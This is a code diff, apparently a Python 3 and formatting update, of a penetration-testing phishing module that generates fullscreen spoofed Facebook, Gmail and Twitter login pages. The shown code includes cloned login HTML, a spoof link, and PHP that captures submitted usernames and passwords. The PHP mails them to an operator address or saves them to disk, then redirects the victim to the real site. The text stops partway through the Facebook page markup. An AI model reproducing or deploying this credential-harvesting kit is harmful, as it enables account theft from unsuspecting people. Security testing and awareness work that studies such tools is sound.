         if err == "COPY":
             pass
 
-
-        self.outputText("\n[*] Attempting to Create The PHP Code Now.......\n","red")
+        self.outputText(
+            "\n[*] Attempting to Create The PHP Code Now.......\n", "red")
 
         indexList = []
         # Disk or Mail default is disk if there is an error somehow
@@ -1804,15 +1902,18 @@ goat =
         # Redirect Check and do
         if otherList[1] == "REDIRECT_DEFAULT":
             if optionList[0] == "GMAIL":
-                indexList.append("https://accounts.google.com/ServiceLoginAuth")
+                indexList.append(
+                    "https://accounts.google.com/ServiceLoginAuth")
             elif optionList[0] == "FB":
-                indexList.append("https://www.facebook.com/login.php?login_attempt=1")  
+                indexList.append(
+                    "https://www.facebook.com/login.php?login_attempt=1")
             elif optionList[0] == "TWITTER":
-                indexList.append("https://twitter.com/login/error?redirect_after_login=%2F&username_or_email=")  
+                indexList.append(
+                    "https://twitter.com/login/error?redirect_after_login=%2F&username_or_email=")
         else:
             indexList.append(otherList[1])
 
-        # intel Verbose check now loud or quiet 
+        # intel Verbose check now loud or quiet
         if otherList[0] == "INTEL_VERBOSE_LOUD":
             indexList.append("loud")
         elif otherList[0] == "INTEL_VERBOSE_HUSH":
@@ -1828,30 +1929,28 @@ goat =
         else:
             # Random file has been picked we dont need a name
             indexList.append("POOP")
-        
 
         # Put together the final list to create the index file
         indexFBList = []
         if otherList[2] == "DEFAULT_SPOOF":
-          if optionList[0] == "GMAIL":
+            if optionList[0] == "GMAIL":
                 indexFBList.append("https://www.gmail.com")
-          elif optionList[0] == "FB":
-                indexFBList.append("https://www.facebook.com")  
-          elif optionList[0] == "TWITTER":
-                indexFBList.append("https://www.twitter.com")  
+            elif optionList[0] == "FB":
+                indexFBList.append("https://www.facebook.com")
+            elif optionList[0] == "TWITTER":
+                indexFBList.append("https://www.twitter.com")
         else:
-           indexFBList.append(optionList[2])
-
+            indexFBList.append(optionList[2])
 
         if otherList[3] == "DEFAULT_URL_NAME":
-          if optionList[0] == "GMAIL":
+            if optionList[0] == "GMAIL":
                 indexFBList.append("Gmail Login")
-          elif optionList[0] == "FB":
-                indexFBList.append("Facebook Login")  
-          elif optionList[0] == "TWITTER":
-                indexFBList.append("Twitter Login")  
+            elif optionList[0] == "FB":
+                indexFBList.append("Facebook Login")
+            elif optionList[0] == "TWITTER":
+                indexFBList.append("Twitter Login")
         else:
-           indexFBList.append(otherList[3])
+            indexFBList.append(otherList[3])
 
         if otherList[5] == "TITLE_DEFAULT":
             if optionList[0] == "GMAIL":
@@ -1864,7 +1963,7 @@ goat =
         else:
             title = otherList[5]
 
-        # image body 
+        # image body
         indexFBList.append("img/facebook/fb.png")
         # JS Files now
         indexFBList.append("js/libs/jquery-1.7.2.js")
@@ -1873,44 +1972,52 @@ goat =
         indexFBList.append("js/libs/jquery-ui-1.8.18.custom.min.js")
         indexFBList.append("js/script.js")
 
-
         fbCode = []
         # Decide what code we need
         if optionList[0] == "FB":
             # Facebook html / PHP append code
-            fbCode.append(self.fullscreenFileHTML(indexFBList,"img",indexList,title,"FB"))      
+            fbCode.append(self.fullscreenFileHTML(
+                indexFBList, "img", indexList, title, "FB"))
         elif optionList[0] == "GMAIL":
             # Gmail html / PHP append code
-            fbCode.append(self.fullscreenFileHTML(indexFBList,"img",indexList,title,"GMAIL"))      
+            fbCode.append(self.fullscreenFileHTML(
+                indexFBList, "img", indexList, title, "GMAIL"))
         elif optionList[0] == "TWITTER":
             # Gmail html / PHP append code
-            fbCode.append(self.fullscreenFileHTML(indexFBList,"img",indexList,title,"TWITTER"))          
+            fbCode.append(self.fullscreenFileHTML(
+                indexFBList, "img", indexList, title, "TWITTER"))
 
-        # save as index.php  no path divider this should always be / for localhost or specified host
+        # save as index.php  no path divider this should always be / for
+        # localhost or specified host
         if otherList[4] == "INDEX_DEFAULT":
-            errCheck = self.saveFile(serverList[1] + "/index.php",fbCode,"text")
+            errCheck = self.saveFile(
+                serverList[1] + "/index.php", fbCode, "text")
             if errCheck == "ERR_FILE_OPEN":
-                self.errorOutput("[!] Error - Couldn't Create [index.php] File Check Folder Permissions","yellow")
+                self.errorOutput(
+                    "[!] Error - Couldn't Create [index.php] File Check Folder Permissions", "yellow")
                 return False
         # Save as whatever the user has picked
         else:
-            errCheck = self.saveFile(serverList[1] + "/" + otherList[4],fbCode,"text")
+            errCheck = self.saveFile(
+                serverList[1] + "/" + otherList[4], fbCode, "text")
             if errCheck == "ERR_FILE_OPEN":
-                self.errorOutput("[!] Error - Couldn't Create [\""+otherList[4]+"\"] File Check Folder Permissions","yellow")
+                self.errorOutput("[!] Error - Couldn't Create [\"" +
+                                 otherList[4] + "\"] File Check Folder Permissions", "yellow")
                 return False
-        
+
         # Check if the path of the file is there and created
-        if os.path.exists(serverList[1]+"/"+otherList[4]) or os.path.exists(serverList[1]+ "/index.php"):
+        if os.path.exists(serverList[1] + "/" + otherList[4]) or os.path.exists(serverList[1] + "/index.php"):
             # Success on writing it seeems
             return True
-																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																						
-        else: return False
-  
-   ################################################################################
-   ################################################################################
 
-    def outputText(self,text,color):
-    # this actually outputs text plus whatever color nothing fancy
+        else:
+            return False
+
+   ##########################################################################
+   ##########################################################################
+
+    def outputText(self, text, color):
+        # this actually outputs text plus whatever color nothing fancy
 
         # Obviously a POSIX System grab color
         if self.determineOperatingSystem() != "windows":
@@ -1936,7 +2043,7 @@ goat =
                 color = '\033[92m'
             elif color == "black":
                 color = '\033[30m'
- 
+
         # Windows lol :P
         elif self.determineOperatingSystem() == "windows":
 
@@ -1962,64 +2069,64 @@ goat =
                 color = ''
 
         # Display User Text
-        print (color + text)
+        print((color + text))
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
-    def displayPrompt(self,promptType = "Main"):
-    # This Displays the command prompt and returns the data in a list
-    # Depending on what command prompt you want
+    def displayPrompt(self, promptType="Main"):
+        # This Displays the command prompt and returns the data in a list
+        # Depending on what command prompt you want
 
         try:
             if promptType == "Main":
-                self.outputText('',"green") 
-                try: 
-                    self.inputData = raw_input("set:fsattack> ")
+                self.outputText('', "green")
+                try:
+                    self.inputData = input("set:fsattack> ")
                 except:
-                    self.inputData = raw_input("set:fsattack> ")
+                    self.inputData = input("set:fsattack> ")
             # FullScreen Prompt
             elif promptType == "FullScreen":
-                self.outputText('',"blue") 
+                self.outputText('', "blue")
                 try:
-                    self.inputData = raw_input("set:fsattack:gen> ")
+                    self.inputData = input("set:fsattack:gen> ")
                 except:
-                    self.inputData = raw_input("set:fsattack:gen> ")
+                    self.inputData = input("set:fsattack:gen> ")
             elif promptType == "XSS":
-                self.outputText('',"white") 
+                self.outputText('', "white")
                 try:
-                    self.inputData = raw_input("set:fsattack:xssGen> ")
+                    self.inputData = input("set:fsattack:xssGen> ")
                 except:
-                    self.inputData = raw_input("set:fsattack:xssGen> ")
-            else: 
-                self.outputText('',"darkgreen")
+                    self.inputData = input("set:fsattack:xssGen> ")
+            else:
+                self.outputText('', "darkgreen")
                 # When in Doubt Display Default Please
                 try:
-                    self.inputData = raw_input("set:pf> ")
+                    self.inputData = input("set:pf> ")
                 except:
-                    self.inputData = raw_input("set:pf> ")
+                    self.inputData = input("set:pf> ")
         except EOFError:
             pass
         # if control c skip and enter
         except KeyboardInterrupt:
             # Initiate an Exit command
             self.inputData = "99"
-        try:	
+        try:
             # cast to string incase its !string for split
             handOff = str(self.inputData)
-            # take input and explode at space for commands and such	
+            # take input and explode at space for commands and such
             self.inputData = handOff.split(" ")
         except UnboundLocalError:
             pass
-	
+
         # return input data
         return self.inputData
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
-    def checkString(self,string):
-    # character other then  . - a-z - A-Z - 0-9 
+    def checkString(self, string):
+        # character other then  . - a-z - A-Z - 0-9
 
         # implement the filter pattern
         pattern = r'[^\.a-zA-Z0-9]'
@@ -2027,17 +2134,16 @@ goat =
             # Not Alpha-Numerical
             return False
         else:
-            # Only Alpha-Numerical 
+            # Only Alpha-Numerical
             return True
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
-    def returnPrompt(self,promptType):
-    # This just returns the user to main prompt on default 
-    # If we need to add extra functionality lets do it
-       
-     
+    def returnPrompt(self, promptType):
+        # This just returns the user to main prompt on default
+        # If we need to add extra functionality lets do it
+
         if promptType == "FULL_SCREEN":
             self.phishMenuFullScreen(False)
         # Return back to Main Screen
@@ -2050,30 +2156,30 @@ goat =
             # Return to Main Prompt
             self.phishMenuMain(False)
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
-    def errorOutput(self,errMsg,colorMsg,promptType = "FULL_SCREEN"):
-    # This Handles all the Errors in the Module
-    # If you want to log them also you can add that here :D
-       
+    def errorOutput(self, errMsg, colorMsg, promptType="FULL_SCREEN"):
+        # This Handles all the Errors in the Module
+        # If you want to log them also you can add that here :D
+
         # Throw Error
-        self.outputText(errMsg,colorMsg)
+        self.outputText(errMsg, colorMsg)
         # Return to Prompt
         self.returnPrompt(promptType)
 
-
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
     def phpEnabled(self):
-    # Checks if PHP is Enabled and should we use it for added functionality
+        # Checks if PHP is Enabled and should we use it for added functionality
 
         phpList = []
-        # PHP Must be Enabled lets check   
-        self.results = raw_input("\nIs PHP Enabled on your WebServer? ( y OR n ): ")      
+        # PHP Must be Enabled lets check
+        self.results = input(
+            "\nIs PHP Enabled on your WebServer? ( y OR n ): ")
         if self.results.lower()[0] == "y" or self.results.lower() == "yes":
-            phpList.append("YES_PHP")  
+            phpList.append("YES_PHP")
         elif self.results[0].lower() == "n" or self.results.lower() == "no":
             self.phpInstalled = """\n
             [*]  PHP Must be Installed on the Server for 
@@ -2082,80 +2188,87 @@ goat =
                  to relay important information. 
                ( Such As the Pen Test Victims Information ) 
             """
-            self.outputText(self.phpInstalled,"white")
-            self.errorOutput("\t[!] Error - PHP Must be Installed And Available ","yellow")
+            self.outputText(self.phpInstalled, "white")
+            self.errorOutput(
+                "\t[!] Error - PHP Must be Installed And Available ", "yellow")
         else:
-            self.errorOutput("[!] Error - Please Enter Yes or No ","yellow")
+            self.errorOutput("[!] Error - Please Enter Yes or No ", "yellow")
 
         return phpList
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
+  ##########################################################################
 
-     
-  ############################################################################################################
-
-    def getRelayFullScreenInformation(self,phpEnabled = "YES_PHP"):   
-    # Sort out how we are gonna store phished results 
+    def getRelayFullScreenInformation(self, phpEnabled="YES_PHP"):
+        # Sort out how we are gonna store phished results
 
         storageList = []
         # Mail or Disk ask user
-        self.results = raw_input("\nHow Should We Relay Victim Web Form Information? ( [m]ail,[d]isk ) : ")
+        self.results = input(
+            "\nHow Should We Relay Victim Web Form Information? ( [m]ail,[d]isk ) : ")
         if self.results.lower()[0] == "m" or self.results.lower() == "mail":
-            self.outputText("\n[!] Warning - Sendmail Should be Configured and Working with PHP For This to Work\n","yellow")
+            self.outputText(
+                "\n[!] Warning - Sendmail Should be Configured and Working with PHP For This to Work\n", "yellow")
             storageList.append("MAIL")
-            self.results = raw_input("\nPlease Enter an Email Address For Form Credentials to Get Sent Too: ")
-            # If we can split by @ its ok not a serious check not a reason for one if there stupid its there fault..
+            self.results = input(
+                "\nPlease Enter an Email Address For Form Credentials to Get Sent Too: ")
+            # If we can split by @ its ok not a serious check not a reason for
+            # one if there stupid its there fault..
             if self.results.split("@") and len(self.results) > 5:
                 storageList.append(self.results)
             else:
                 # Throw Error improper email no @
-                self.errorOutput("[!] Error Please Enter a Correct Email Address","yellow")
+                self.errorOutput(
+                    "[!] Error Please Enter a Correct Email Address", "yellow")
         elif self.results.lower()[0] == "d" or self.results.lower() == "disk":
             # We need PHP to store the file on server
             if phpEnabled == "NO_PHP":
-                self.errorOutput("[!] Error - We Can't Write the File to the Servers Disk Without PHP Enabled","yellow")
+                self.errorOutput(
+                    "[!] Error - We Can't Write the File to the Servers Disk Without PHP Enabled", "yellow")
             else:
                 storageList.append("DISK")
                 # Ask if they want a Random File name created
-                self.results = raw_input("\nWould you like a Random file name Created for each Submission? ([y]es or [n]o) : ")
+                self.results = input(
+                    "\nWould you like a Random file name Created for each Submission? ([y]es or [n]o) : ")
                 if self.results.lower()[0] == "y" or self.results.lower() == "yes":
                     storageList.append("RANDOM_FILE")
                 else:
-                    self.results = raw_input("\nSpecify a File Name for the saved Intel? ( Ex: f00d ) : ")
+                    self.results = input(
+                        "\nSpecify a File Name for the saved Intel? ( Ex: f00d ) : ")
                     # Check if string is AlphaNumerical
-                    if  self.checkString(self.results) == False:
-                        self.errorOutput("[!] Error - Invalid File Name Specified! AlphaNumerical + Periods Only! ","yellow")
+                    if self.checkString(self.results) == False:
+                        self.errorOutput(
+                            "[!] Error - Invalid File Name Specified! AlphaNumerical + Periods Only! ", "yellow")
                     else:
                         storageList.append(self.results)
         else:
-            self.errorOutput("[!] Error - Please Specify either [m]ail or [d]isk ! ","yellow")
-
+            self.errorOutput(
+                "[!] Error - Please Specify either [m]ail or [d]isk ! ", "yellow")
 
         # Return List for use
         return storageList
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
     def xssPayloadGenerator(self):
-    # Very Simple XSS Payload Generator 
-    # TODO: Complete This Function
+        # Very Simple XSS Payload Generator
+        # TODO: Complete This Function
 
         bannerDisplay = """\n\n
             [*] Under development!
 
             """
-        self.outputText(bannerDisplay,"yellow")
+        self.outputText(bannerDisplay, "yellow")
         self.phishMenuMain(False)
 
-
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
     def exitFullScreenPhish(self):
-    # Add The Return SET Menu Here
+        # Add The Return SET Menu Here
 
         # Grab Application Name
         appName = sys.argv[0]
@@ -2165,12 +2278,12 @@ goat =
             # close linux unix processes
             self.closeLinuxUnixProcesses(appName)
 
-        # Winblows Check	        
+        # Winblows Check
         elif self.determineOperatingSystem() == "windows":
             # close windows processes
             self.closeWindowsProcesses(appName)
 
-        # No POSIX System or Windows Fail Silently and Exit 
+        # No POSIX System or Windows Fail Silently and Exit
         else:
             pass
 
@@ -2179,31 +2292,31 @@ goat =
         [!] Closing any Processes Open By Module
         [!] Returning Back to Web Attacks Menu\n
         """
-        self.outputText(self.fullScreenExitBanner,"cyan")
+        self.outputText(self.fullScreenExitBanner, "cyan")
 
         # Exit Success  TODO: EDIT THIS TO CALL SET MENU
-        # THIS SHOULD RETURN BACK TO WEB ATTACK MENU HERE 
-        #exit(0)
+        # THIS SHOULD RETURN BACK TO WEB ATTACK MENU HERE
+        # exit(0)
         return True
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
-    def closeWindowsProcesses(self,appName):
-    # This kills all windows processes running braH 
+    def closeWindowsProcesses(self, appName):
+        # This kills all windows processes running braH
 
         # kill process
         try:
             handle = subprocess.Popen(appName, shell=False)
-            subprocess.Popen("taskkill /F /T /PID %i"%handle.pid , shell=True) 
+            subprocess.Popen("taskkill /F /T /PID %i" % handle.pid, shell=True)
         except (ValueError, OSError):
             pass
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
-    def closeLinuxUnixProcesses(self,appName):
-    # close out all processes in linux n unix machines
+    def closeLinuxUnixProcesses(self, appName):
+        # close out all processes in linux n unix machines
 
         p = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
         out, err = p.communicate()
@@ -2215,26 +2328,25 @@ goat =
                 except OSError:
                     pass
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
     def determineOperatingSystem(self):
-    # return the operating system to user 
+        # return the operating system to user
 
-        # assign the variables 
+        # assign the variables
         operating_system = self.checkOs()
         # Returns operating system
         return operating_system
 
-
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
     def checkOs(self):
-    #actually does the grunt work returns the operating system 
+        # actually does the grunt work returns the operating system
 
-	 # This function only looks for Mac,Linux or Windows
-	 # check if its apple user
+         # This function only looks for Mac,Linux or Windows
+         # check if its apple user
         if sys.platform == "darwin":
             operating_system = "posix"
         # Check for Windows
@@ -2248,13 +2360,11 @@ goat =
         # Return our operating system
         return operating_system
 
-   ################################################################################
-   ################################################################################
-
+   ##########################################################################
+   ##########################################################################
 
     def displayAboutFullScreen(self):
-    # This just displays a description about the attacks 
-
+        # This just displays a description about the attacks
 
         self.aboutFullScreenTop = """
       \n\t[?] About - FullScreen API Generator Attack \n 
@@ -2296,104 +2406,105 @@ goat =
       =   writing the information to disk.
         """
 
-        self.outputText(self.aboutFullScreenTop,"white")
-        self.outputText(self.aboutFullScreenBottom,"darkyellow")
-        self.outputText(self.aboutFullScreenFooter,"yellow")
+        self.outputText(self.aboutFullScreenTop, "white")
+        self.outputText(self.aboutFullScreenBottom, "darkyellow")
+        self.outputText(self.aboutFullScreenFooter, "yellow")
 
         # Display Prompt Again
         self.phishMenuFullScreen(False)
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
-    def openFile(self,fileInput,fileType):
-    # This method only opens and returns a file
-    # for you to do the manipulation and use the data from the file
-        
-	# check if the file is present	
+    def openFile(self, fileInput, fileType):
+        # This method only opens and returns a file
+        # for you to do the manipulation and use the data from the file
+
+        # check if the file is present
         if os.path.exists(fileInput):
 
             if fileType == "text":
-		
+
                 try:
-	            # open the file for return
-                    openFile = open(fileInput,'r+')
+                    # open the file for return
+                    openFile = open(fileInput, 'r+')
                 except IOError:
-                    #Throw Errr Couldnt Open
+                    # Throw Errr Couldnt Open
                     return "ERR_FILE_OPEN"
-		
+
             if fileType == "bin":
-  
+
                 try:
-	            # open the file for return
-                    openFile= open(fileInput,'r+b')
+                    # open the file for return
+                    openFile = open(fileInput, 'r+b')
                 except IOError:
-                    #Throw Errr Couldnt Open
+                    # Throw Errr Couldnt Open
                     return "ERR_FILE_OPEN"
-	     # return the file	
+             # return the file
             return openFile
         else:
-            # No file found to open throw error		
+            # No file found to open throw error
             return "NO_FILE_FOUND"
-	
-   ################################################################################
-   ################################################################################
- 
-    def saveFile(self,fileInput,fileData,fileType):
-    # This saves the file creates one and saves it not exists or appends if it does 
+
+   ##########################################################################
+   ##########################################################################
+
+    def saveFile(self, fileInput, fileData, fileType):
+        # This saves the file creates one and saves it not exists or appends if
+        # it does
 
         if fileType == "text":
             try:
                 if os.path.isfile(fileInput):
-	             # save the file append because it already exists
-                    openFile = open(fileInput,'a+')
-                    # write file 
+                     # save the file append because it already exists
+                    openFile = open(fileInput, 'a+')
+                    # write file
                     for s in (str(item[0]) for item in fileData):
-                        openFile.write(s+'\n')
+                        openFile.write(s + '\n')
                 else:
                     # Write file it doesnt exist yet from what we can tell
-                    openFile = open(fileInput,'w+')
-                    # write file 
+                    openFile = open(fileInput, 'w+')
+                    # write file
                     for s in (str(item[0]) for item in fileData):
-                        openFile.write(s+'\n')
-	         # close
+                        openFile.write(s + '\n')
+                # close
                 openFile.close()
 
             except IOError:
-                 #Throw Errr Couldnt Open
-                 return "ERR_FILE_OPEN"
-		
+                # Throw Errr Couldnt Open
+                return "ERR_FILE_OPEN"
+
         if fileType == "bin":
             try:
                 if os.path.isfile(fileInput):
-	             # save the file append because it already exists
-                    openFile = open(fileInput,'a+b')
-                    # write file 
+                     # save the file append because it already exists
+                    openFile = open(fileInput, 'a+b')
+                    # write file
                     for s in (str(item[0]) for item in fileData):
-                        openFile.write(s+'\n')
+                        openFile.write(s + '\n')
                 else:
                     # Write file it doesnt exist yet from what we can tell
-                    openFile = open(fileInput,'w+b')
-                    # write file 
+                    openFile = open(fileInput, 'w+b')
+                    # write file
                     for s in (str(item[0]) for item in fileData):
-                        openFile.write(s+'\n')
-	         # close
+                        openFile.write(s + '\n')
+                # close
                 openFile.close()
 
             except IOError:
-                 #Throw Errr Couldnt Open
-                 return "ERR_FILE_OPEN"
-		
-	 # return TRUE  file_written
+                # Throw Errr Couldnt Open
+                return "ERR_FILE_OPEN"
+
+         # return TRUE  file_written
         return "FILE_WRITTEN"
 
-   ################################################################################
-   ################################################################################
+   ##########################################################################
+   ##########################################################################
 
-    def fullscreenFileHTML(self,pathList,imgPath,valueList,title,codeType):
-    # This Holds All the HTML for the Fullscreen Attack Files [ fullscreen generation  only ]
-    # This is a long function lol could be split into another file but i wanted to keep
-    # everything in one file just for ease of portability at first.         
+    def fullscreenFileHTML(self, pathList, imgPath, valueList, title, codeType):
+        # This Holds All the HTML for the Fullscreen Attack Files [ fullscreen generation  only ]
+        # This is a long function lol could be split into another file but i wanted to keep
+        # everything in one file just for ease of portability at first.
 
         # twitter HTML for twitter fullscreen site
         if codeType == "TWITTER":
@@ -2404,13 +2515,13 @@ goat =
 <head>
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-<title>"""+title+"""</title>
+<title>""" + title + """</title>
 <meta name="description" content="">
 <link rel="stylesheet" href="css/style.css">
 </head>
 <body>
   
-   <a class=\"spoofLink\" href=\""""+pathList[0]+"""\">"""+pathList[1]+"""</a>
+   <a class=\"spoofLink\" href=\"""" + pathList[0] + """\">""" + pathList[1] + """</a>
 
   <div id="spoofHeader">
     <div id="spoofMenu"></div>
@@ -3333,11 +3444,11 @@ data-fouc-class-names="swift-loading"
 
 
 </div>        
-        <script src=\""""+pathList[3]+"""\"></script> 
-        <script src=\""""+pathList[4]+"""\"></script>
-        <script src=\""""+pathList[5]+"""\"></script>
-        <script src=\""""+pathList[6]+"""\"></script>
-        <script src=\""""+pathList[7]+"""\"></script>
+        <script src=\"""" + pathList[3] + """\"></script> 
+        <script src=\"""" + pathList[4] + """\"></script>
+        <script src=\"""" + pathList[5] + """\"></script>
+        <script src=\"""" + pathList[6] + """\"></script>
+        <script src=\"""" + pathList[7] + """\"></script>
 
 </body>
 </html>
@@ -3403,11 +3514,11 @@ function userAgent(){
 
 if(isset($_POST['submit'])){
 
-       $action  = \""""+valueList[0]+"""\";
-       $redirect = \""""+valueList[1]+"""\";
-       $verbose = \""""+valueList[2]+"""\";
-       $fileName = \""""+valueList[3]+"""\";
-       $to = \""""+valueList[3]+"""\";
+       $action  = \"""" + valueList[0] + """\";
+       $redirect = \"""" + valueList[1] + """\";
+       $verbose = \"""" + valueList[2] + """\";
+       $fileName = \"""" + valueList[3] + """\";
+       $to = \"""" + valueList[3] + """\";
        // Grab Form Values
        $email = $_POST[\"Username\"];
        $password =  $_POST[\"Password\"];
@@ -3460,8 +3571,7 @@ if(isset($_POST['submit'])){
             # Append code to list
             indexList.append(indexCode)
             # Append Index List
-            return indexList    
-
+            return indexList
 
         # GMAIL HTML For GMAIL
         if codeType == "GMAIL":
@@ -3472,13 +3582,13 @@ if(isset($_POST['submit'])){
 <head>
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-<title>"""+title+"""</title>
+<title>""" + title + """</title>
 <meta name="description" content="">
 <link rel="stylesheet" href="css/style.css">
 </head>
 <body>
   
-   <a class=\"spoofLink\" href=\""""+pathList[0]+"""\">"""+pathList[1]+"""</a>
+   <a class=\"spoofLink\" href=\"""" + pathList[0] + """\">""" + pathList[1] + """</a>
 
   <div id="spoofHeader">
     <div id="spoofMenu"></div>
@@ -5166,11 +5276,11 @@ if(isset($_POST['submit'])){
   </body>
 </html>
 </div>        
-        <script src=\""""+pathList[3]+"""\"></script> 
-        <script src=\""""+pathList[4]+"""\"></script>
-        <script src=\""""+pathList[5]+"""\"></script>
-        <script src=\""""+pathList[6]+"""\"></script>
-        <script src=\""""+pathList[7]+"""\"></script>
+        <script src=\"""" + pathList[3] + """\"></script> 
+        <script src=\"""" + pathList[4] + """\"></script>
+        <script src=\"""" + pathList[5] + """\"></script>
+        <script src=\"""" + pathList[6] + """\"></script>
+        <script src=\"""" + pathList[7] + """\"></script>
 
 </body>
 </html>
@@ -5237,11 +5347,11 @@ function userAgent(){
 
 if(isset($_POST['submit'])){
 
-       $action  = \""""+valueList[0]+"""\";
-       $redirect = \""""+valueList[1]+"""\";
-       $verbose = \""""+valueList[2]+"""\";
-       $fileName = \""""+valueList[3]+"""\";
-       $to = \""""+valueList[3]+"""\";
+       $action  = \"""" + valueList[0] + """\";
+       $redirect = \"""" + valueList[1] + """\";
+       $verbose = \"""" + valueList[2] + """\";
+       $fileName = \"""" + valueList[3] + """\";
+       $to = \"""" + valueList[3] + """\";
        // Grab Form Values
        $email = $_POST[\"Username\"];
        $password =  $_POST[\"Password\"];
@@ -5292,10 +5402,9 @@ if(isset($_POST['submit'])){
 ?>
             """
             # Append Code to list
-            indexList.append(indexCode) 
+            indexList.append(indexCode)
             # Append Index List
-            return indexList  
-
+            return indexList
 
         # Facebook HTML For FullScreeen
         if codeType == "FB":
@@ -5305,13 +5414,13 @@ if(isset($_POST['submit'])){
 <head>
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-<title>"""+title+"""</title>
+<title>""" + title + """</title>
 <meta name="description" content="">
 <link rel="stylesheet" href="css/style.css">
 </head>
 <body>
   
-   <a class=\"spoofLink\" href=\""""+pathList[0]+"""\">"""+pathList[1]+"""</a>
+   <a class=\"spoofLink\" href=\"""" + pathList[0] + """\">""" + pathList[1] + """</a>
 
 
 <div id="spoofHeader">
@@ -5331,11 +5440,11 @@ if(isset($_POST['submit'])){
   </head><body class="login_page fbx UIPage_LoggedOut gecko Locale_en_US"><div class="_li"><div id="pagelet_bluebar" data-referrer="pagelet_bluebar"><div id="blueBarHolder"><div id="blueBar"><div><div class="loggedout_menubar_container"><div class="clearfix loggedout_menubar"><a class="lfloat" href="/" title="Go to Facebook Home"><i class="fb_logo img sp_459faa sx_955643"><u>Facebook logo</u></i></a></div></div><div class="signupBanner"><div class="signup_bar_container"><div class="signup_box clearfix"><span class="signup_box_content"><a class="_42ft _42fu signup_btn selected _42gz _42gy" role="button" href="/r.php?locale=en_US">Sign Up</a></span></div></div></div></div></div></div></div><div id="globalContainer" class="uiContextualLayerParent"><div id="content" class="fb_content clearfix"><div class="UIFullPage_Container"><div class="mvl ptm uiInterstitial login_page_interstitial uiInterstitialLarge uiBoxWhite"><div class="uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader"><div class="clearfix uiHeaderTop"><div class="rfloat"><h2 class="accessible_elem">Facebook Login</h2><div class="uiHeaderActions"></div></div><div><h2 class="uiHeaderTitle" aria-hidden="true">Facebook Login</h2></div></div></div><div class="phl ptm uiInterstitialContent"><div class="login_form_container"><form id="login_form" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post"><input type="hidden" name="lsd" value="AVpNsm0y" autocomplete="off" /><div class="hidden_elem"></div><div id="loginform"><input type="hidden" autocomplete="off" id="display" name="display" value="" /><input type="hidden" autocomplete="off" id="enable_profile_selector" name="enable_profile_selector" value="" /><input type="hidden" autocomplete="off" id="legacy_return" name="legacy_return" value="1" /><input type="hidden" autocomplete="off" id="next" name="next" value="" /><input type="hidden" autocomplete="off" id="profile_selector_ids" name="profile_selector_ids" value="" /><input type="hidden" autocomplete="off" id="trynum" name="trynum" value="1" /><input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_0" /><input type="hidden" name="lgnrnd" value="223259_LlDE" /><input type="hidden" id="lgnjs" name="lgnjs" value="n" /><div class="form_row clearfix"><label for="email" class="login_form_label">Email or Phone:</label><input type="text" class="inputtext" id="email" name="Username" value="" /></div><div class="form_row clearfix"><label for="pass" class="login_form_label">Password:</label><input type="password" name="Password" id="pass" class="inputpassword" /></div><div class="persistent"><div class="uiInputLabel clearfix"><input id="persist_box" type="checkbox" value="1" name="persistent" class="uiInputLabelCheckbox" /><label for="persist_box">Keep me logged in</label></div></div><input type="hidden" autocomplete="off" id="default_persistent" name="default_persistent" value="0" /><div id="buttons" class="form_row clearfix"><label class="login_form_label"></label><div id="login_button_inline"><label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1"><input value="Log In" name="submit" type="submit" id="u_0_1" /></label></div><div id="register_link">or <strong><a href="/r.php?next&amp;locale=en_US&amp;display=page" target="_self" rel="nofollow" id="reg_btn_link" tabindex="-1">Sign up for Facebook</a></strong></div></div><p class="reset_password form_row"><a href="https://www.facebook.com/recover/initiate" target="" tabindex="-1">Forgot your password?</a></p></div></form></div></div></div><ul class="uiList ptm localeSelectorList _509- _4ki _6-h _6-j _6-i"><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;en_US&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="English (US)">English (US)</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;es_LA&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Spanish">Español</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;pt_BR&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Portuguese (Brazil)">Português (Brasil)</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;fr_FR&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="French (France)">Français (France)</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;de_DE&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="German">Deutsch</a></li><li><a dir="ltr" href="https://www.facebook.com/login.php" onclick="intl_set_cookie_locale(&quot;it_IT&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);" title="Italian">Italiano</a></li><li><a dir="rtl" href="https://www.facebook.com/login.php" 